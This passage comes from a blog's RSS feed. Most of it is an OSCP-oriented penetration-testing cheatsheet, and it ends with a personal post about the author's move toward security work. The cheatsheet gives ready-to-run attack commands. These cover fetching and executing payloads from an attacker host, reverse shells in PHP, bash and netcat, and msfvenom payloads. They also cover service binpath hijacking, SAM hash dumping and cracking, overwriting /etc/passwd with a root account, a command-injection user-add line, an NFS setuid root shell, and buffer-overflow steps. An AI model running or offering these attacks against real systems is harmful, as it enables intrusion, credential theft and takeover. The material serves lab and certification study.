+&lt;pre>&lt;code class="language-console" data-lang="console">mount | grep cifs
+grep cifs /proc/mount
+&lt;/code>&lt;/pre>&lt;h3 id="http">HTTP&lt;/h3>
+&lt;p>From your local attacker machine, create a http server with:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sudo python3 -m http.server 80
+sudo python2 -m SimpleHTTPServer 80
+&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;s also possible to specify which path to share, for example:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
+&lt;/code>&lt;/pre>&lt;h4 id="windows">Windows&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">iex(new-object net.webclient).downloadstring(&amp;quot;http://192.168.42.42/evil.ps1)
+certutil.exe -urlcache -split -f &amp;quot;http://192.168.42.42/nc.exe&amp;quot; nc.exe
+IWR -Uri &amp;quot;http://192.168.42.42/n64.exe&amp;quot; -Outfile &amp;quot;n64.exe&amp;quot;
+&lt;/code>&lt;/pre>&lt;h4 id="linux">Linux&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
+&lt;/code>&lt;/pre>&lt;h3 id="ftp">FTP&lt;/h3>
+&lt;p>If there is an ftp server which we have access, we can upload files there through it, the &amp;quot;&amp;quot; is the same for both, windows or linux:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">Connect and login with:
+ftp 192.168.42.42
+Upload the files with:
+put evil.py
+Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:
+pass
+followed by enter
+&lt;/code>&lt;/pre>&lt;h3 id="sockets">Sockets&lt;/h3>
+&lt;p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
+Create the socket with:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">Attacker:
+nc -lvnp 443 &amp;lt; evil.php
+For both cases from windows, the only difference is to write nc.exe
+Victim:
+nc -v 192.168.42.42 443 &amp;gt; evil.php
+&lt;/code>&lt;/pre>&lt;h3 id="rdp">RDP&lt;/h3>
+&lt;p>If we have access to a windows machine with a valid user/credentials and this user is in the &amp;ldquo;Remote Desktop Users&amp;rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+&lt;/code>&lt;/pre>&lt;h2 id="pivoting">Pivoting&lt;/h2>
+&lt;p>It&amp;rsquo;s possible to do pivoting by using proxychains, pure nc&amp;rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&amp;rsquo;s a transparent proxy server that works like &amp;ldquo;a vpn&amp;rdquo;, and doesn&amp;rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&amp;rsquo;t work through sshuttle.&lt;/p>
+&lt;h3 id="sshuttle">sshuttle&lt;/h3>
+&lt;h4 id="one-hop">One hop&lt;/h4>
+&lt;p>Let&amp;rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &amp;ldquo;vpn&amp;rdquo; to talk directly to those servers, for that, we use:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sshuttle ceso@192.168.20.35 192.168.30.0/24
+&lt;/code>&lt;/pre>&lt;h4 id="multi-hops">Multi-hops&lt;/h4>
+&lt;p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &amp;ldquo;vpn&amp;rdquo; through this multiple hops, so&amp;hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&amp;rsquo;t intend to provide a 100% precise network diagram):&lt;/p>
+&lt;img src="https://ceso.github.io/images/cheatsheet/multiple-hop-sshuttle.png" class="center" style="border-radius: 8px;" />
+&lt;p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&amp;rsquo;s based on the example above, but is easy to extrapolate to different scenarios):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">Host fw.example.mgmt
+Hostname 192.168.20.35
+User userOnFw
+IdentityFile ~/.ssh/priv_key_fw
+Host foreman.example.mgmt
+Hostname 192.168.30.40
+User root
+ProxyJump fw.example.mgmt
+IdentityFile ~/.ssh/priv_key_internal
+&lt;/code>&lt;/pre>&lt;p>And now to setup the &amp;ldquo;multiple hop vpn&amp;rdquo;, run:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;amp;
+Later on is possible to connect from the local machine:
+ssh foo@192.168.25.74
+&lt;/code>&lt;/pre>&lt;h2 id="reverse-shells">Reverse shells&lt;/h2>
+&lt;h3 id="php">php&lt;/h3>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> $sock &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fsockopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;192.168.42.42&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;443&amp;#34;&lt;/span>); $proc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">proc_open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/sh -i&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>$sock, &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>$sock, &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>$sock), $pipes); &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;192.168.42.42&amp;#34;,443);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="bash">bash&lt;/h3>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.42.42/443 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sh--nc">sh + nc&lt;/h3>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> | nc 192.168.42.42 &lt;span style="color:#ae81ff">443&lt;/span> &amp;gt;/tmp/f
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&amp;quot;192.168.42.42&amp;quot; LPORT=443 -f raw -o reverse_shell.cgi
+&lt;/code>&lt;/pre>&lt;h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war rev_shell.war
+&lt;/code>&lt;/pre>&lt;h3 id="windows-htpp-download-reverse-shell">Windows HTPP download reverse shell&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -a x86 --platform windows -p windows/exec CMD=&amp;quot;powershell \&amp;quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&amp;quot;&amp;quot; -e x86/unicode_mixed BufferRegister=EAX -f python
+&lt;/code>&lt;/pre>&lt;h3 id="windows-staged-reverse-tcp">Windows staged reverse TCP&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+&lt;/code>&lt;/pre>&lt;h3 id="windows-stageless-reverse-tcp">Windows stageless reverse TCP&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &amp;lt;output_name.format&amp;gt;
+&lt;/code>&lt;/pre>&lt;h3 id="linux-staged-reverse-tcp">Linux staged reverse TCP&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &amp;lt;outout_name&amp;gt;.elf
+&lt;/code>&lt;/pre>&lt;h3 id="linux-staged-reverse-tcp-1">Linux staged reverse TCP&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &amp;lt;outout_name&amp;gt;.elf
+&lt;/code>&lt;/pre>&lt;h2 id="privilege-escalation">Privilege escalation&lt;/h2>
+&lt;h3 id="windows-1">Windows&lt;/h3>
+&lt;h4 id="run-as">Run-As&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">PS C:\&amp;gt; $secstr = New-Object -TypeName System.Security.SecureString
+PS C:\&amp;gt; $username = &amp;quot;&amp;lt;domain&amp;gt;\&amp;lt;user&amp;gt;&amp;quot;
+PS C:\&amp;gt; $password = '&amp;lt;password&amp;gt;'
+PS C:\&amp;gt; $secstr = New-Object -TypeName System.Security.SecureString
+PS C:\&amp;gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+PS C:\&amp;gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+PS C:\&amp;gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://&amp;lt;ip/host&amp;gt;:&amp;lt;port&amp;gt;/path/to/file.evil') } -Credential $cred -Computer localhost
+-----------------------------------------------------------------------------------------------------
+Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
+&lt;/code>&lt;/pre>&lt;h4 id="incorrect-permisions-in-services-sc-config-binpath">Incorrect permisions in services (sc config binpath)&lt;/h4>
+&lt;p>Binpath is set as running &lt;code>cmd.exe&lt;/code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to &lt;code>cmd.exe&lt;/code> remains):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sc config upnphost binpath= &amp;quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&amp;quot;
+&lt;/code>&lt;/pre>&lt;h4 id="sam--system--security">SAM + SYSTEM + Security&lt;/h4>
+&lt;p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
+sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+&lt;/code>&lt;/pre>&lt;h3 id="linux-1">Linux&lt;/h3>
+&lt;h4 id="homeuseropenssl-ep-empty-capabilities">/home/user/openssl =ep (empty capabilities)&lt;/h4>
+&lt;p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">cp /etc/passwd /tmp/passwd.orig
+cp /etc/passwd /tmp/passwd.custom
+&lt;/code>&lt;/pre>&lt;p>Now, a custom user will be created and added to &lt;code>/tmp/passwd.custom&lt;/code> with &lt;code>customPassword&lt;/code> and as root user (UID = GID = 0):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">echo 'ceso:'&amp;quot;$( openssl passwd -6 -salt xyz customPassword )&amp;quot;':0:0::/tmp:/bin/bash' &amp;gt;&amp;gt; /tmp/passwd.custom
+&lt;/code>&lt;/pre>&lt;p>Now, create a custom &lt;code>key.pem&lt;/code> and &lt;code>cert.pem&lt;/code> with openssl:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+&lt;/code>&lt;/pre>&lt;p>Encrypt the new custom passwd:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
+&lt;/code>&lt;/pre>&lt;p>Now, decrypt the custom passwd overwritting in the process the real one (&lt;code>/etc/passwd&lt;/code>):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">cd /
+/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
+&lt;/code>&lt;/pre>&lt;p>And finally, just login with the user created with root privileges by using &lt;code>customPassword&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">su - ceso
+&lt;/code>&lt;/pre>&lt;h4 id="command-web-injection-add-user">Command web injection: add user&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i
+&lt;/code>&lt;/pre>&lt;h4 id="nfs-no_root_squashinsecurerw">NFS; no_root_squash,insecure,rw&lt;/h4>
+&lt;p>If &lt;code>/etc/exports&lt;/code> has a line like:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
+/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
+&lt;/code>&lt;/pre>&lt;p>NFS is being exported and you and you have ssh access to the machine.
+From your attacker machine &lt;strong>while logged as root&lt;/strong> user run:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
+mount -t nfs 127.0.0.1:/srv/pelota my_share
+cd my_share
+cat &amp;gt; shell.c&amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main(){
+setuid(0);
+setgid(0);
+system(&amp;quot;/bin/bash&amp;quot;);
+}
+EOF
+gcc shell.c -o shell
+chmod u+s shell
+&lt;/code>&lt;/pre>&lt;p>Now from inside a SSH session on the victim machine (in this example &lt;code>192.168.42.32&lt;/code>):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">bash-4.2$ cd /srv/pelota
+bash-4.2$ ./shell
+bash-4.2# id
+uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+&lt;/code>&lt;/pre>&lt;h2 id="good-to-know-either-windows-andor-linux">Good to know (either Windows and/or Linux)&lt;/h2>
+&lt;h3 id="arch-cross-compile-exploit-and-diff-glibc-version">Arch cross compile exploit (and diff glibc version)&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+&lt;/code>&lt;/pre>&lt;h3 id="ip-restriction-at-application-level-bypass">IP restriction at application level, bypass&lt;/h3>
+&lt;p>Try to send a request modifying the HTTP header by adding:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">X-Forwarder-For: &amp;lt;ip allowed&amp;gt;
+&lt;/code>&lt;/pre>&lt;h3 id="windows---check-os-information">Windows - check OS information&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">systeminfo
+ver
+&lt;/code>&lt;/pre>&lt;h3 id="windows---check-architecture">Windows - check architecture&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">wmic os get osarchitecture
+echo %PROCESSOR_ARCHITECTURE%
+&lt;/code>&lt;/pre>&lt;h3 id="powershell--running-as-32-or-64-bits">Powershell running as 32 or 64 bits&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">[Environment]::Is64BitProcess
+&lt;/code>&lt;/pre>&lt;h3 id="linux-lfi---intesresting-files-to-look-after">Linux LFI - intesresting files to look after&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">/proc/self/status
+/proc/self/environ
+/etc/passwd
+/etc/hosts
+/etc/exports
+&lt;/code>&lt;/pre>&lt;h2 id="simple-buffer-overflow-32-bits-no-aslr-and-no-dep">Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)&lt;/h2>
+&lt;h3 id="summarized-steps">Summarized steps&lt;/h3>
+&lt;ul>
+&lt;li>0 - Crash the application&lt;/li>
+&lt;li>1 - Fuzzing (find aprox number of bytes where the crash took place)&lt;/li>
+&lt;li>2 - Find offset&lt;/li>
+&lt;li>3 - EIP control&lt;/li>
+&lt;li>4 - Check for enough space on buffer&lt;/li>
+&lt;li>5 - Badchars counting&lt;/li>
+&lt;li>6 - Find return address (JMP ESP)&lt;/li>
+&lt;li>7 - Create payload&lt;/li>
+&lt;/ul>
+&lt;h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">cat &amp;gt; trun.spk &amp;lt;&amp;lt;EOF
+s_readline();
+s_string(&amp;quot;TRUN &amp;quot;);
+s_string_variable(&amp;quot;COMMAND&amp;quot;);
+EOF
+&lt;/code>&lt;/pre>&lt;p>Now, start wireshark filtering on the target IP/PORT below and run the &lt;code>trun.spk&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
+&lt;/code>&lt;/pre>&lt;p>Once a crash takes place, go to wireshark to locate the crash.&lt;/p>
+&lt;h3 id="badchars">Badchars&lt;/h3>
+&lt;p>From the block below, the next ones were not included (most common badchars):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">\x00 --&amp;gt; null byte
+\x0a --&amp;gt; new line character (AKA &amp;quot;\n&amp;quot;)
+&lt;/code>&lt;/pre>&lt;p>So&amp;hellip;actual list of badchars:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+&lt;/code>&lt;/pre>&lt;h3 id="usefull-tools-on-kali-linux">Usefull tools (on Kali Linux)&lt;/h3>
+&lt;h4 id="create_pattern">create_pattern&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+/usr/bin/msf-pattern_create
+&lt;/code>&lt;/pre>&lt;h4 id="pattern_offset">pattern_offset&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
+/usr/bin/msf-pattern_offset
+&lt;/code>&lt;/pre>&lt;h4 id="nasm_shell">nasm_shell&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+/usr/bin/msf-nasm_shell
+&lt;/code>&lt;/pre>&lt;h4 id="msfvenom">msfvenom&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/metasploit-framework/msfvenom
+/usr/bin/msfvenom
+&lt;/code>&lt;/pre>&lt;h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
+&lt;/code>&lt;/pre></description></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid><description>&lt;p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.&lt;/p>
+&lt;p>I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people
+who blogs!&amp;rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&amp;hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.&lt;/p>
+&lt;p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
+So far in this aprox. 5 years, I meet really nice people (as also not), and make really really nice friends, and of course been learning quite a lot of stuff, but&amp;hellip;there is something that since I started I been avoiding (Programming), and something I&amp;rsquo;ve been looking forward to learning it but thinking I can&amp;rsquo;t do it (Security), these two things have been chasing me for a longg longg time (at the point of making me feel a bit depressed).&lt;/p>
+&lt;p>As I mentioned above, it&amp;rsquo;s been around 9 months since I moved abroad (arrived in the Netherlands at ends of Apr. 2019), of this 9 months I spend 6 months in bench, without a project to work it (yes, getting my salary, but being anxious as I&amp;rsquo;m, makes you to feel some panic when you get a paid for not doing nothing, even if you are studying), in this months I had a lot of time to think about myself, my career, what I wanted to do in the future, do I like to be a DevOps &amp;ldquo;for all my life&amp;rdquo; (today is devops, tomorrow who knows being as how IT works, so is just for saying it in a way), so&amp;hellip;I started to study/practice with the book &amp;lsquo;How to Design Programs&amp;rsquo; (HtDP), even feeling I&amp;rsquo;m going slow looking backwards and comparing to now, I think even if I still haven&amp;rsquo;t finished, it indeed has been allowing me to grow.
+Now&amp;hellip;great, but, what about security? Is still there, and I really would like to start doing stuff NOW (I&amp;rsquo;m more a learn-by-doing person), and not wait until get all my way through a designing programs book, combined with my thoughts of &amp;ldquo;I can&amp;rsquo;t do Sec. without coding/I can&amp;rsquo;t even imagine being breaking stuff without deep understanding of data-types, algorithms&amp;rdquo;, I was getting nowhere, so I decided to try to re-program that mindset of mine, that results in me exchanging words with friends about it, talking with people who are currently into sec, and so far was an excellent idea&amp;hellip;thanks to that now I know coding is not needed (as in mandatory) but it helps a lot to at least being able to write scripts, understand the workflow of exploits and modify them, like other things, and&amp;hellip;that&amp;rsquo;s something I CAN DO (and have to experience in it).&lt;/p>
+&lt;p>Said that now my goal is to jump into the Sec. field, I started to play with boxes in HTB and reading some books, this has allowed me to set my first checkpoint: getting the OSCP cert, not for the cert itself, but more for the challenge and some compensation-ish for not having experience into sec.
+Once getting the OSCP, I will come back to the HtDP to polish my programming skills (or why not, also try to keep it in parallel?), and keep climbing (I love rock climbing/bouldering, so I could use a lot of metaphors from it!) my way up to the tops, trying to not compare me with other people, enjoying the route, and learning from all my falls; a fight between me and me.&lt;/p>
+&lt;p>I will use this space to post walk-throughs in some HTB boxes, blog some thoughts once in a while (like this post itself), stuff in my path of also learning Dutch, etc.&lt;/p>
+&lt;p>So far so good, keep learning and never stop doing it.&lt;/p></description></item></channel></rss>
